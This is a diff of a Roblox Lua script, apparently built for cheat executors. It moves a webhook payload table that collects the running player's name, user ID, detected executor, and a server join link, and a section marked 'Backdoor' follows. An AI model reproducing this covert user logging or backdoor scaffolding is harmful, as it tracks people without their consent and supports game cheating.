@@ -18,25 +18,6 @@ if usingAvatarHeadshotAsPFP then
     customPFP = "https://www.roblox.com/Thumbs/Avatar.ashx?x=500&y=500&Format=Png&userId=" .. game:GetService("Players").LocalPlayer.UserId
 end
 
-local data = {
-    ["username"] = webhookUsername,
-    ["avatar_url"] = customPFP,
-    ["embeds"] = {
-        {
-            ["type"] = "rich",
-            ["color"] = tonumber(color),
-            ["fields"] = {
-                {
-                    ["name"] = "Script: " .. scriptName,
-                    ["value"] = "User: **" ..game:GetService("Players").LocalPlayer.Name .."**\nID: **" ..game:GetService("Players").LocalPlayer.UserId .."**\nExploit: **" ..getexploit() .."**\n[Join Server](https://www.roblox.com/games/" ..game.PlaceId .."/GAME?serverJobId=" ..game.JobId ..")/[Profile](https://www.roblox.com/users/" ..game:GetService("Players").LocalPlayer.UserId .."/profile)",
-                    ["inline"] = true
-                }
-            }
-        }
-    }
-}
-
-
 local function getexploit()
   local exploit =
       (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
@@ -88,6 +69,24 @@ local globalMethods = {
     isXClosure = is_synapse_function or issentinelclosure or is_protosmasher_closure or is_sirhurt_closure or checkclosure
 }
 
+
+local data = {
+    ["username"] = webhookUsername,
+    ["avatar_url"] = customPFP,
+    ["embeds"] = {
+        {
+            ["type"] = "rich",
+            ["color"] = tonumber(color),
+            ["fields"] = {
+                {
+                    ["name"] = "Script: " .. scriptName,
+                    ["value"] = "User: **" ..game:GetService("Players").LocalPlayer.Name .."**\nID: **" ..game:GetService("Players").LocalPlayer.UserId .."**\nExploit: **" ..getexploit() .."**\n[Join Server](https://www.roblox.com/games/" ..game.PlaceId .."/GAME?serverJobId=" ..game.JobId ..")/[Profile](https://www.roblox.com/users/" ..game:GetService("Players").LocalPlayer.UserId .."/profile)",
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+}
 
 -- >> Backdoor.							<< --
 
